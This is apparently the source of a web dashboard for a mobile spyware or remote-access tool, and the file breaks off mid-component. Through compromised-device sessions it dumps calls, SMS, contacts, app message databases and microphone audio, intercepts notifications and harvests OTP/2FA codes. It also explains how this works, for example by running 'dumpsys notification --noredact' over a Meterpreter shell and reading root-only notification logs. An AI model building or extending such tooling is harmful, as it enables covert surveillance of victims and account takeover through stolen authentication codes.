"use client";

/**
 * COMMS INTELLIGENCE HUB
 *
 * Capabilities:
 *  • Phone call log dump + live recording
 *  • Social media database extraction (WhatsApp, Telegram, Signal, Facebook,
 *    Instagram, Snapchat, TikTok, Twitter/X, Discord, Viber, WeChat, Line, Skype)
 *  • SMS / MMS intercept
 *  • VoIP / call audio capture
 *  • IMEI / IMSI / SIM info
 *  • Contact book dump
 *  • Email account capture
 *  • Browser saved passwords / cookies
 */

import { useState, useCallback, useEffect } from "react";
import { supabase } from "@/lib/supabase";

// ── Types ──────────────────────────────────────────────────────
type Session = { id: number; ip: string; platform: string; hostname: string; username: string };
type CommsResult = { ok: boolean; output?: string; records?: Record<string, unknown>[]; error?: string };

type CallRecord = {
  number: string; name?: string; type: "INCOMING" | "OUTGOING" | "MISSED";
  duration: number; timestamp: string;
};

type SmsRecord = {
  address: string; body: string; type: "INBOX" | "SENT" | "DRAFT";
  date: string; read: boolean;
};

type ContactRecord = { name: string; phones: string[]; emails: string[] };

type SocialApp = {
  id: string; name: string; pkg: string; icon: string;
  status: "unknown" | "available" | "extracting" | "done" | "unavailable";
  recordCount?: number;
  requiresRoot?: boolean;
};

// ── Social media app registry ─────────────────────────────────
const SOCIAL_APPS: SocialApp[] = [
  { id: "whatsapp",   name: "WhatsApp",    pkg: "com.whatsapp",                   icon: "💬", status: "unknown" },
  { id: "whatsapp_b", name: "WA Business", pkg: "com.whatsapp.w4b",               icon: "💼", status: "unknown" },
  { id: "telegram",   name: "Telegram",    pkg: "org.telegram.messenger",         icon: "✈️", status: "unknown" },
  { id: "signal",     name: "Signal",      pkg: "org.thoughtcrime.securesms",     icon: "🔐", status: "unknown", requiresRoot: true },
  { id: "fb_msg",     name: "Messenger",   pkg: "com.facebook.orca",              icon: "🔵", status: "unknown" },
  { id: "instagram",  name: "Instagram",   pkg: "com.instagram.android",          icon: "📷", status: "unknown" },
  { id: "snapchat",   name: "Snapchat",    pkg: "com.snapchat.android",           icon: "👻", status: "unknown" },
  { id: "tiktok",     name: "TikTok",      pkg: "com.zhiliaoapp.musically",       icon: "🎵", status: "unknown" },
  { id: "twitter",    name: "X / Twitter", pkg: "com.twitter.android",            icon: "🐦", status: "unknown" },
  { id: "discord",    name: "Discord",     pkg: "com.discord",                    icon: "🎮", status: "unknown" },
  { id: "viber",      name: "Viber",       pkg: "com.viber.voip",                 icon: "📞", status: "unknown" },
  { id: "wechat",     name: "WeChat",      pkg: "com.tencent.mm",                 icon: "🟢", status: "unknown", requiresRoot: true },
  { id: "line",       name: "Line",        pkg: "jp.naver.line.android",          icon: "📗", status: "unknown" },
  { id: "skype",      name: "Skype",       pkg: "com.skype.raider",               icon: "🔷", status: "unknown" },
  { id: "kik",        name: "Kik",         pkg: "kik.android",                    icon: "💬", status: "unknown" },
  { id: "linkedin",   name: "LinkedIn",    pkg: "com.linkedin.android",           icon: "💼", status: "unknown" },
  { id: "gmail",      name: "Gmail",       pkg: "com.google.android.gm",          icon: "📧", status: "unknown" },
  { id: "outlook",    name: "Outlook",     pkg: "com.microsoft.office.outlook",   icon: "📧", status: "unknown" },
  { id: "gmsg",       name: "G Messages",  pkg: "com.google.android.apps.messaging", icon: "💬", status: "unknown" },
];

const STATUS_BADGE: Record<string, string> = {
  unknown:     "border-gray-800 text-gray-600",
  available:   "border-green-700 text-green-500",
  extracting:  "border-yellow-700 text-yellow-400 animate-pulse",
  done:        "border-green-600 text-green-400 bg-green-950/30",
  unavailable: "border-red-900 text-red-800",
};

export default function CommsPage() {
  const [sessions, setSessions] = useState<Session[]>([]);
  const [selectedSession, setSelectedSession] = useState<Session | null>(null);
  const [activeTab, setActiveTab] = useState<"calls" | "sms" | "contacts" | "social" | "device" | "audio" | "notifications">("calls");
  const [apps, setApps] = useState<SocialApp[]>(SOCIAL_APPS);
  const [calls, setCalls] = useState<CallRecord[]>([]);
  const [sms, setSms] = useState<SmsRecord[]>([]);
  const [contacts, setContacts] = useState<ContactRecord[]>([]);
  const [deviceInfo, setDeviceInfo] = useState<Record<string, string>>({});
  const [audioRecs, setAudioRecs] = useState<string[]>([]);
  const [recording, setRecording] = useState(false);
  const [recordDuration, setRecordDuration] = useState(60);
  const [socialMessages, setSocialMessages] = useState<Record<string, unknown[]>>({});
  const [loading, setLoading] = useState<string | null>(null);
  const [log, setLog] = useState<string[]>([]);

  // ── Notification state ────────────────────────────────────────
  type NotifRecord = {
    pkg: string; appLabel: string; title: string; text: string;
    subText?: string; when: string; channel?: string;
    isOtp: boolean; otpCode?: string; _ts: number;
  };
  type OtpHit = { source: string; code: string; context: string; ts: string };
  const [notifs, setNotifs] = useState<NotifRecord[]>([]);
  const [otpHits, setOtpHits] = useState<OtpHit[]>([]);
  const [pollId, setPollId] = useState<string | null>(null);
  const [pollActive, setPollActive] = useState(false);
  const [notifFilter, setNotifFilter] = useState<"all" | "otp" | string>("all");
  const [notifPlatform, setNotifPlatform] = useState<"android" | "windows">("android");

  const addLog = useCallback((msg: string) => {
    setLog((prev) => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev].slice(0, 100));
  }, []);

  // ── Load sessions ────────────────────────────────────────────
  useEffect(() => {
    fetch("/api/sessions")
      .then((r) => r.json())
      .then((d) => {
        const list = Array.isArray(d) ? d : d.sessions ?? [];
        setSessions(list);
        if (list.length > 0) setSelectedSession(list[0]);
      })
      .catch(() => {});
  }, []);

  // ── Execute comms command ────────────────────────────────────
  const execComms = useCallback(async (action: string, extra?: Record<string, unknown>): Promise<CommsResult> => {
    if (!selectedSession) return { ok: false, error: "No session selected" };
    const r = await fetch("/api/comms", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ session_id: selectedSession.id, action, ...extra }),
    });
    return r.json() as Promise<CommsResult>;
  }, [selectedSession]);

  // ── Notification handlers (declared after execComms) ─────────
  const dumpNotifs = useCallback(async () => {
    setLoading("notifications");
    addLog("Dumping notifications (dumpsys)…");
    const action = notifPlatform === "windows" ? "notif_windows" : "notif_dump";
    const res = await execComms(action);
    if (res.ok && res.records) {
      setNotifs(res.records as NotifRecord[]);
      addLog(`Notifications: ${res.records.length} captured`);
    } else {
      addLog(`Notification error: ${res.error ?? "failed"}`);
    }
    setLoading(null);
  }, [execComms, addLog, notifPlatform]);

  const dumpNotifLog = useCallback(async () => {
    setLoading("notifications");
    addLog("Reading notification history log (root)…");
    const res = await execComms("notif_log");
    if (res.ok && res.records) {
      setNotifs(prev => [...(res.records as NotifRecord[]), ...prev].slice(0, 1000));
      addLog(`Notification log: ${res.records.length} entries`);
    } else {
      addLog(`Log error: ${res.error ?? "failed"}`);
    }
    setLoading(null);
  }, [execComms, addLog]);

  const sweepOtps = useCallback(async () => {
    setLoading("otp");
    addLog("Sweeping for OTP codes…");
    const res = await execComms("notif_otp");
    if (res.ok) {
      const combined = (res as unknown as { combined?: OtpHit[] }).combined ?? [];
      setOtpHits(prev => [...combined, ...prev].slice(0, 200));
      addLog(`OTP sweep: ${combined.length} codes found`);
    } else {
      addLog(`OTP sweep error: ${res.error ?? "failed"}`);
    }
    setLoading(null);
  }, [execComms, addLog]);

  const startLivePoll = useCallback(async () => {
    if (!selectedSession) return;
    addLog("Starting live notification monitor…");
    const res = await execComms("notif_poll_start");
    if ((res as unknown as { pollId?: string }).pollId) {
      const pid = (res as unknown as { pollId: string }).pollId;
      setPollId(pid);
      setPollActive(true);
      addLog(`Monitor started (poll: ${pid})`);
    }
  }, [execComms, addLog, selectedSession]);

  const stopLivePoll = useCallback(async () => {
    if (!pollId) return;
    await execComms("notif_poll_stop", { poll_id: pollId });
    setPollActive(false);
    setPollId(null);
    addLog("Notification monitor stopped");
  }, [execComms, addLog, pollId]);

  // Poll for new notifications every 20s when active
  useEffect(() => {
    if (!pollActive || !pollId) return;
    const interval = setInterval(async () => {
      const lastTs = notifs[0]?._ts ?? 0;
      const res = await fetch("/api/comms", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ session_id: selectedSession?.id, action: "notif_poll_fetch", poll_id: pollId, since: lastTs }),
      });
      const d = await res.json() as { ok: boolean; records?: NotifRecord[] };
      if (d.ok && d.records && d.records.length > 0) {
        setNotifs(prev => [...d.records!, ...prev].slice(0, 1000));
        const otps = d.records!.filter((r) => r.isOtp);
        if (otps.length > 0) {
          addLog(`🔑 ${otps.length} OTP code(s) captured!`);
          setOtpHits(prev => [...otps.map((r) => ({ source: r.appLabel, code: r.otpCode!, context: `${r.title}: ${r.text}`, ts: r.when })), ...prev].slice(0, 200));
        }
      }
    }, 20000);
    return () => clearInterval(interval);
  }, [pollActive, pollId, notifs, selectedSession, addLog]);

  // ── Dump call log ────────────────────────────────────────────
  const dumpCalls = useCallback(async () => {
    setLoading("calls");
    addLog("Dumping call log…");
    const res = await execComms("call_log");
    if (res.ok && res.records) {
      setCalls(res.records as CallRecord[]);
      addLog(`Call log: ${res.records.length} entries`);
    } else {
      addLog(`Call log error: ${res.error ?? res.output ?? "unknown"}`);
    }
    setLoading(null);
  }, [execComms, addLog]);

  // ── Dump SMS ─────────────────────────────────────────────────
  const dumpSms = useCallback(async () => {
    setLoading("sms");
    addLog("Dumping SMS database…");
    const res = await execComms("sms");
    if (res.ok && res.records) {
      setSms(res.records as SmsRecord[]);
      addLog(`SMS: ${res.records.length} messages`);
    } else {
      addLog(`SMS error: ${res.error ?? "unknown"}`);
    }
    setLoading(null);
  }, [execComms, addLog]);

  // ── Dump contacts ────────────────────────────────────────────
  const dumpContacts = useCallback(async () => {
    setLoading("contacts");
    addLog("Dumping contacts…");
    const res = await execComms("contacts");
    if (res.ok && res.records) {
      setContacts(res.records as ContactRecord[]);
      addLog(`Contacts: ${res.records.length} entries`);
    } else {
      addLog(`Contacts error: ${res.error ?? "unknown"}`);
    }
    setLoading(null);
  }, [execComms, addLog]);

  // ── Device info ───────────────────────────────────────────────
  const dumpDeviceInfo = useCallback(async () => {
    setLoading("device");
    addLog("Gathering device intelligence…");
    const res = await execComms("device_info");
    if (res.ok && res.records?.[0]) {
      setDeviceInfo(res.records[0] as Record<string, string>);
      addLog("Device info captured");
    } else {
      addLog(`Device info error: ${res.error ?? "unknown"}`);
    }
    setLoading(null);
  }, [execComms, addLog]);

  // ── Record audio ──────────────────────────────────────────────
  const startRecording = useCallback(async () => {
    setRecording(true);
    addLog(`Starting mic capture (${recordDuration}s)…`);
    const res = await execComms("record_audio", { duration: recordDuration });
    setRecording(false);
    if (res.ok) {
      const file = res.output ?? "audio_" + Date.now() + ".wav";
      setAudioRecs((prev) => [file, ...prev]);
      addLog(`Audio captured: ${file}`);
    } else {
      addLog(`Audio error: ${res.error ?? "unknown"}`);
    }
  }, [execComms, addLog, recordDuration]);

  // ── Social extraction ─────────────────────────────────────────
  const extractSocial = useCallback(async (app: SocialApp) => {
    setApps((prev) => prev.map((a) => a.id === app.id ? { ...a, status: "extracting" } : a));
    addLog(`Extracting ${app.name} data…`);
    const res = await execComms("social_extract", { app_pkg: app.pkg, app_id: app.id });
    if (res.ok && res.records) {
      setSocialMessages((prev) => ({ ...prev, [app.id]: res.records! }));
      setApps((prev) => prev.map((a) => a.id === app.id ? { ...a, status: "done", recordCount: res.records!.length } : a));
      addLog(`${app.name}: ${res.records.length} messages/records`);
    } else {
      setApps((prev) => prev.map((a) => a.id === app.id ? { ...a, status: "unavailable" } : a));
      addLog(`${app.name}: not installed or no access`);
    }
  }, [execComms, addLog]);

  const extractAllSocial = useCallback(async () => {
    for (const app of SOCIAL_APPS) {
      await extractSocial(app);
    }
  }, [extractSocial]);

  // ── Supabase realtime for new captures ───────────────────────
  useEffect(() => {
    if (!selectedSession) return;
    // Watch for captured files from this session's device
    const ch = supabase
      .channel("comms-files")
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "captured_files" }, (payload) => {
        const f = payload.new as { filename?: string; type?: string };
        if (f.filename) addLog(`New file captured: ${f.filename}`);
      })
      .subscribe();
    return () => { supabase.removeChannel(ch); };
  }, [selectedSession, addLog]);

  const TABS = [
    { id: "calls",         label: "CALLS",    icon: "📞" },
    { id: "sms",           label: "SMS/MMS",  icon: "💬" },
    { id: "contacts",      label: "CONTACTS", icon: "👥" },
    { id: "social",        label: "SOCIAL",   icon: "🌐" },
    { id: "notifications", label: "NOTIF",    icon: "🔔" },
    { id: "device",        label: "DEVICE ID",icon: "📱" },
    { id: "audio",         label: "AUDIO",    icon: "🎙️" },
  ] as const;

  return (
    <div className="flex h-screen bg-[#030308] text-green-400 font-mono overflow-hidden">
      {/* ── LEFT: Session selector ───────────────────────────── */}
      <aside className="w-56 flex-shrink-0 border-r border-green-900/30 flex flex-col">
        <div className="p-3 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-1">COMMS INTEL HUB</div>
          <div className="text-[8px] text-green-900/40">CLASS: TOP SECRET // SI</div>
        </div>
        <div className="p-2 border-b border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-2">ACTIVE SESSIONS</div>
          {sessions.length === 0 && (
            <div className="text-[9px] text-green-900/50 text-center py-2">NO SESSIONS</div>
          )}
          {sessions.map((s) => (
            <button
              key={s.id}
              onClick={() => setSelectedSession(s)}
              className={`w-full text-left p-2 rounded border mb-1 transition-all ${
                selectedSession?.id === s.id
                  ? "border-green-700/60 bg-green-950/40"
                  : "border-green-900/20 hover:border-green-800/40"
              }`}
            >
              <div className="text-[10px] text-green-400">SESSION #{s.id}</div>
              <div className="text-[8px] text-green-800">{s.hostname ?? s.ip}</div>
              <div className="text-[8px] text-green-900">{s.platform?.toUpperCase()}</div>
            </button>
          ))}
        </div>

        {/* Quick actions */}
        <div className="p-2 space-y-1">
          <div className="text-[9px] text-green-900 tracking-widest mb-1.5">QUICK EXTRACT</div>
          {[
            { label: "DUMP ALL CALLS", fn: dumpCalls },
            { label: "DUMP ALL SMS",   fn: dumpSms },
            { label: "DUMP CONTACTS",  fn: dumpContacts },
            { label: "DEVICE INFO",    fn: dumpDeviceInfo },
          ].map(({ label, fn }) => (
            <button key={label} onClick={fn}
              className="w-full py-1.5 text-[9px] tracking-widest border border-green-900/30 hover:border-green-700/50 text-green-800 hover:text-green-500 rounded transition-all text-left px-2">
              {label}
            </button>
          ))}
          <button onClick={extractAllSocial}
            className="w-full py-1.5 text-[9px] tracking-widest border border-blue-900/30 hover:border-blue-700/50 text-blue-800 hover:text-blue-500 rounded transition-all px-2 mt-2">
            EXTRACT ALL SOCIAL
          </button>
          <button onClick={() => { setActiveTab("notifications"); dumpNotifs(); }}
            className="w-full py-1.5 text-[9px] tracking-widest border border-yellow-900/30 hover:border-yellow-700/50 text-yellow-800 hover:text-yellow-500 rounded transition-all px-2 mt-1">
            DUMP NOTIFICATIONS
          </button>
          <button onClick={() => { setActiveTab("notifications"); sweepOtps(); }}
            className="w-full py-1.5 text-[9px] tracking-widest border border-red-900/30 hover:border-red-700/50 text-red-800 hover:text-red-500 rounded transition-all px-2">
            🔑 SWEEP OTP CODES
          </button>
        </div>

        {/* Log */}
        <div className="flex-1 overflow-y-auto p-2 border-t border-green-900/30">
          <div className="text-[9px] text-green-900 tracking-widest mb-1">ACTIVITY LOG</div>
          {log.map((l, i) => (
            <div key={i} className="text-[8px] text-green-900/70 leading-4 mb-0.5">{l}</div>
          ))}
        </div>
      </aside>

      {/* ── MAIN ─────────────────────────────────────────────── */}
      <div className="flex-1 flex flex-col overflow-hidden">
        {/* Tabs */}
        <div className="flex border-b border-green-900/30 bg-[#030308] flex-shrink-0">
          {TABS.map((t) => (
            <button
              key={t.id}
              onClick={() => setActiveTab(t.id)}
              className={`px-4 py-2 text-[10px] tracking-widest transition-all border-b-2 ${
                activeTab === t.id
                  ? "border-green-500 text-green-400"
                  : "border-transparent text-green-900 hover:text-green-700"
              }`}
            >
              {t.icon} {t.label}
            </button>
          ))}
        </div>

        <div className="flex-1 overflow-y-auto p-4">
          {/* ── CALLS ─────────────────────────────────────────── */}
          {activeTab === "calls" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-xs tracking-widest text-green-400">CALL LOG INTELLIGENCE</h2>
                <button onClick={dumpCalls} disabled={loading === "calls"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-50">
                  {loading === "calls" ? "EXTRACTING…" : "↓ DUMP CALLS"}
                </button>
                <span className="ml-auto text-[9px] text-green-900">{calls.length} RECORDS</span>
              </div>
              {calls.length === 0 ? (
                <EmptyState label="No call records extracted" sub="Click DUMP CALLS to extract from target device" />
              ) : (
                <div className="space-y-1">
                  <div className="grid grid-cols-5 text-[9px] text-green-900 px-3 mb-1 tracking-widest">
                    <span>TYPE</span><span>NUMBER</span><span>NAME</span><span>DURATION</span><span>TIME</span>
                  </div>
                  {calls.map((c, i) => (
                    <div key={i} className="grid grid-cols-5 gap-2 px-3 py-2 border border-green-900/20 rounded text-[10px] hover:bg-green-950/20 transition-all">
                      <span className={c.type === "MISSED" ? "text-red-500" : c.type === "INCOMING" ? "text-green-400" : "text-blue-400"}>
                        {c.type === "INCOMING" ? "↙" : c.type === "OUTGOING" ? "↗" : "✕"} {c.type}
                      </span>
                      <span className="text-green-300">{c.number}</span>
                      <span className="text-green-700">{c.name ?? "—"}</span>
                      <span className="text-green-800">{c.duration}s</span>
                      <span className="text-green-900">{new Date(c.timestamp).toLocaleString()}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── SMS ───────────────────────────────────────────── */}
          {activeTab === "sms" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-xs tracking-widest text-green-400">SMS / MMS INTERCEPT</h2>
                <button onClick={dumpSms} disabled={loading === "sms"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-50">
                  {loading === "sms" ? "EXTRACTING…" : "↓ DUMP SMS"}
                </button>
                <span className="ml-auto text-[9px] text-green-900">{sms.length} MESSAGES</span>
              </div>
              {sms.length === 0 ? (
                <EmptyState label="No SMS records" sub="Click DUMP SMS to extract messages from target" />
              ) : (
                <div className="space-y-1">
                  {sms.map((s, i) => (
                    <div key={i} className={`px-3 py-2.5 border rounded ${s.type === "INBOX" ? "border-green-900/30" : "border-blue-900/20"}`}>
                      <div className="flex items-center gap-2 mb-1">
                        <span className={`text-[9px] border px-1 rounded ${s.type === "INBOX" ? "border-green-800 text-green-600" : "border-blue-800 text-blue-600"}`}>
                          {s.type}
                        </span>
                        <span className="text-[10px] text-green-400">{s.address}</span>
                        <span className="ml-auto text-[8px] text-green-900">{new Date(s.date).toLocaleString()}</span>
                        {!s.read && <span className="w-1.5 h-1.5 rounded-full bg-green-400" />}
                      </div>
                      <div className="text-[10px] text-green-300 leading-relaxed">{s.body}</div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── CONTACTS ──────────────────────────────────────── */}
          {activeTab === "contacts" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-xs tracking-widest text-green-400">CONTACT BOOK EXTRACTION</h2>
                <button onClick={dumpContacts} disabled={loading === "contacts"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-50">
                  {loading === "contacts" ? "EXTRACTING…" : "↓ DUMP CONTACTS"}
                </button>
                <span className="ml-auto text-[9px] text-green-900">{contacts.length} CONTACTS</span>
              </div>
              {contacts.length === 0 ? (
                <EmptyState label="No contact records" sub="Click DUMP CONTACTS to extract address book" />
              ) : (
                <div className="grid grid-cols-2 gap-2">
                  {contacts.map((c, i) => (
                    <div key={i} className="border border-green-900/20 rounded p-2.5 hover:bg-green-950/10 transition-all">
                      <div className="text-[11px] text-green-300 mb-1">{c.name}</div>
                      {c.phones.map((p, j) => (
                        <div key={j} className="text-[9px] text-green-700">📞 {p}</div>
                      ))}
                      {c.emails.map((e, j) => (
                        <div key={j} className="text-[9px] text-blue-700">✉ {e}</div>
                      ))}
                    </div>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* ── SOCIAL ────────────────────────────────────────── */}
          {activeTab === "social" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-xs tracking-widest text-green-400">SOCIAL MEDIA INTELLIGENCE</h2>
                <button onClick={extractAllSocial}
                  className="px-3 py-1 text-[9px] tracking-widest border border-blue-700/50 bg-blue-950/20 text-blue-400 rounded hover:bg-blue-900/30 transition-all">
                  EXTRACT ALL
                </button>
              </div>
              <div className="grid grid-cols-3 gap-2 mb-6">
                {apps.map((app) => (
                  <div key={app.id}
                    className={`border rounded p-3 transition-all cursor-pointer hover:border-green-800/50 ${
                      app.status === "done" ? "border-green-700/40 bg-green-950/20" :
                      app.status === "extracting" ? "border-yellow-700/40" :
                      app.status === "unavailable" ? "border-red-900/20 opacity-50" :
                      "border-green-900/20"
                    }`}
                    onClick={() => app.status !== "extracting" && extractSocial(app)}
                  >
                    <div className="flex items-center gap-1.5 mb-1">
                      <span className="text-base">{app.icon}</span>
                      <span className="text-[10px] text-green-400">{app.name}</span>
                      {app.requiresRoot && <span className="text-[7px] text-yellow-700 border border-yellow-900 px-0.5 rounded">ROOT</span>}
                    </div>
                    <div className="text-[8px] text-green-900 mb-1.5 truncate">{app.pkg}</div>
                    <div className={`text-[8px] border px-1.5 py-0.5 rounded-sm inline-block ${STATUS_BADGE[app.status]}`}>
                      {app.status === "done" ? `✓ ${app.recordCount} records` :
                       app.status === "extracting" ? "EXTRACTING…" :
                       app.status === "unavailable" ? "NOT FOUND" :
                       "CLICK TO EXTRACT"}
                    </div>
                  </div>
                ))}
              </div>

              {/* Message viewer */}
              {Object.entries(socialMessages).map(([appId, messages]) => {
                const appDef = SOCIAL_APPS.find((a) => a.id === appId);
                if (!messages.length) return null;
                return (
                  <div key={appId} className="mb-6">
                    <div className="text-[10px] text-green-500 tracking-widest mb-2 flex items-center gap-2">
                      <span>{appDef?.icon}</span>
                      <span>{appDef?.name.toUpperCase()} — {messages.length} RECORDS</span>
                    </div>
                    <div className="space-y-1 max-h-48 overflow-y-auto pr-1">
                      {messages.slice(0, 100).map((msg, i) => {
                        const m = msg as Record<string, unknown>;
                        return (
                          <div key={i} className="border border-green-900/15 rounded px-3 py-1.5 text-[9px]">
                            {Object.entries(m).slice(0, 5).map(([k, v]) => (
                              <span key={k} className="mr-3">
                                <span className="text-green-900">{k}: </span>
                                <span className="text-green-600">{String(v).slice(0, 80)}</span>
                              </span>
                            ))}
                          </div>
                        );
                      })}
                    </div>
                  </div>
                );
              })}
            </div>
          )}

          {/* ── NOTIFICATIONS ─────────────────────────────────── */}
          {activeTab === "notifications" && (
            <div className="space-y-4">
              {/* Controls */}
              <div className="flex flex-wrap items-center gap-2">
                <h2 className="text-xs tracking-widest text-yellow-400">NOTIFICATION INTERCEPT</h2>
                <select value={notifPlatform} onChange={(e) => setNotifPlatform(e.target.value as "android" | "windows")}
                  className="rounded border border-green-900/30 bg-black/60 px-2 py-1 text-[9px] text-green-500 focus:outline-none">
                  <option value="android">Android</option>
                  <option value="windows">Windows</option>
                </select>
                <button onClick={dumpNotifs} disabled={loading === "notifications"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-yellow-700/50 bg-yellow-950/20 text-yellow-500 rounded hover:bg-yellow-900/30 transition-all disabled:opacity-50">
                  {loading === "notifications" ? "DUMPING…" : "↓ DUMP NOW"}
                </button>
                <button onClick={dumpNotifLog} disabled={loading === "notifications"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/40 text-green-700 rounded hover:text-green-500 transition-all disabled:opacity-50">
                  📜 HISTORY LOG (root)
                </button>
                <button onClick={sweepOtps} disabled={loading === "otp"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-red-700/50 bg-red-950/20 text-red-400 rounded hover:bg-red-900/30 transition-all disabled:opacity-50">
                  {loading === "otp" ? "SCANNING…" : "🔑 SWEEP OTPs"}
                </button>
                {!pollActive ? (
                  <button onClick={startLivePoll}
                    className="px-3 py-1 text-[9px] tracking-widest border border-green-600/60 bg-green-950/30 text-green-400 rounded hover:bg-green-900/40 transition-all animate-pulse">
                    ▶ LIVE MONITOR
                  </button>
                ) : (
                  <button onClick={stopLivePoll}
                    className="px-3 py-1 text-[9px] tracking-widest border border-red-700/60 bg-red-950/20 text-red-400 rounded hover:bg-red-900/30 transition-all">
                    ■ STOP MONITOR
                  </button>
                )}
                {pollActive && (
                  <span className="flex items-center gap-1 text-[9px] text-green-500">
                    <span className="h-1.5 w-1.5 rounded-full bg-green-500 animate-pulse" />
                    LIVE · polling every 20s
                  </span>
                )}
              </div>

              {/* OTP alert strip */}
              {otpHits.length > 0 && (
                <div className="rounded border border-red-700/50 bg-red-950/20 p-3 space-y-2">
                  <p className="text-[9px] font-bold tracking-widest text-red-400">🔑 OTP / 2FA CODES INTERCEPTED</p>
                  <div className="space-y-1.5 max-h-40 overflow-y-auto">
                    {otpHits.map((hit, i) => (
                      <div key={i} className="flex items-center gap-3 rounded border border-red-900/30 bg-black/40 px-3 py-1.5">
                        <span className="font-mono text-xl font-bold text-red-300 tracking-[0.3em]">{hit.code}</span>
                        <div className="flex-1 min-w-0">
                          <p className="text-[9px] text-red-400">{hit.source}</p>
                          <p className="truncate text-[8px] text-red-900">{hit.context}</p>
                        </div>
                        <div className="flex gap-1.5">
                          <button onClick={() => { navigator.clipboard.writeText(hit.code); }}
                            className="rounded border border-red-800/50 px-2 py-0.5 text-[8px] text-red-500 hover:text-red-300">
                            COPY
                          </button>
                          <span className="text-[8px] text-red-900">{new Date(hit.ts).toLocaleTimeString()}</span>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              {/* Filter bar */}
              {notifs.length > 0 && (
                <div className="flex flex-wrap gap-1">
                  {["all", "otp", ...Array.from(new Set(notifs.map((n) => n.appLabel))).slice(0, 12)].map((f) => (
                    <button key={f} onClick={() => setNotifFilter(f)}
                      className={`rounded border px-2 py-0.5 text-[9px] transition-all ${
                        notifFilter === f
                          ? "border-yellow-600/60 bg-yellow-950/30 text-yellow-400"
                          : "border-green-900/30 text-green-900 hover:text-green-600"
                      }`}>
                      {f === "all" ? `ALL (${notifs.length})` : f === "otp" ? `🔑 OTP (${notifs.filter((n) => n.isOtp).length})` : f}
                    </button>
                  ))}
                </div>
              )}

              {/* Notification list */}
              {notifs.length === 0 ? (
                <EmptyState label="No notifications captured"
                  sub="Click DUMP NOW for a one-time snapshot, or LIVE MONITOR to stream continuously every 20 seconds" />
              ) : (
                <div className="space-y-1 max-h-[60vh] overflow-y-auto pr-1">
                  {notifs
                    .filter((n) =>
                      notifFilter === "all" ? true :
                      notifFilter === "otp" ? n.isOtp :
                      n.appLabel === notifFilter
                    )
                    .map((n, i) => (
                      <div key={i} className={`rounded border px-3 py-2 transition-all ${
                        n.isOtp
                          ? "border-red-700/50 bg-red-950/20"
                          : "border-green-900/20 bg-black/20 hover:bg-black/30"
                      }`}>
                        <div className="flex items-start justify-between gap-2">
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-0.5">
                              <span className="text-[9px] font-bold text-green-400">{n.appLabel}</span>
                              {n.isOtp && (
                                <span className="rounded border border-red-700/60 bg-red-950/40 px-1.5 py-px text-[8px] font-bold text-red-400">
                                  🔑 OTP: {n.otpCode}
                                </span>
                              )}
                              {n.channel && n.channel !== "null" && (
                                <span className="text-[7px] text-green-900 border border-green-900/20 px-1 rounded">{n.channel}</span>
                              )}
                            </div>
                            {n.title && (
                              <p className="text-[10px] font-semibold text-green-300">{n.title}</p>
                            )}
                            <p className="text-[9px] text-green-700 leading-relaxed">{n.text}</p>
                            {n.subText && <p className="text-[8px] text-green-900 mt-0.5">{n.subText}</p>}
                          </div>
                          <div className="flex-shrink-0 text-right">
                            <p className="text-[8px] text-green-900">{new Date(n.when).toLocaleTimeString()}</p>
                            <p className="text-[7px] text-green-900/50 font-mono">{n.pkg?.split(".").slice(-1)[0]}</p>
                          </div>
                        </div>
                      </div>
                    ))}
                </div>
              )}

              {/* How it works */}
              <div className="rounded border border-green-900/20 bg-green-950/5 p-3 space-y-1.5">
                <p className="text-[9px] font-bold tracking-widest text-green-900">HOW NOTIFICATION INTERCEPTION WORKS</p>
                <div className="space-y-1 text-[8px] text-green-900/70">
                  <p>• <span className="text-green-700">DUMP NOW (Android)</span> — runs <span className="font-mono">dumpsys notification --noredact</span> via Meterpreter shell. Captures ALL currently-displayed notifications: WhatsApp, SMS, banking alerts, Google, Instagram, every app. No root required on most devices.</p>
                  <p>• <span className="text-green-700">HISTORY LOG</span> — reads <span className="font-mono">/data/system/notification_log.xml</span>. Persistent log of past 500 notifications. Requires root.</p>
                  <p>• <span className="text-green-700">LIVE MONITOR</span> — polls every 20 seconds, compares against previous dump, shows only new arrivals in real-time.</p>
                  <p>• <span className="text-green-700">SWEEP OTPs</span> — scans both notification stream and SMS for 4-8 digit codes matching OTP patterns (Google G-XXXXXX, "your code is", etc).</p>
                  <p>• <span className="text-green-700">WINDOWS</span> — downloads <span className="font-mono">wpndatabase.db</span> (WNS push notification store) and parses all toast notification payloads.</p>
                </div>
              </div>
            </div>
          )}

          {/* ── DEVICE ID ─────────────────────────────────────── */}
          {activeTab === "device" && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <h2 className="text-xs tracking-widest text-green-400">DEVICE IDENTIFICATION</h2>
                <button onClick={dumpDeviceInfo} disabled={loading === "device"}
                  className="px-3 py-1 text-[9px] tracking-widest border border-green-700/50 bg-green-950/30 text-green-500 rounded hover:bg-green-900/40 transition-all disabled:opacity-50">
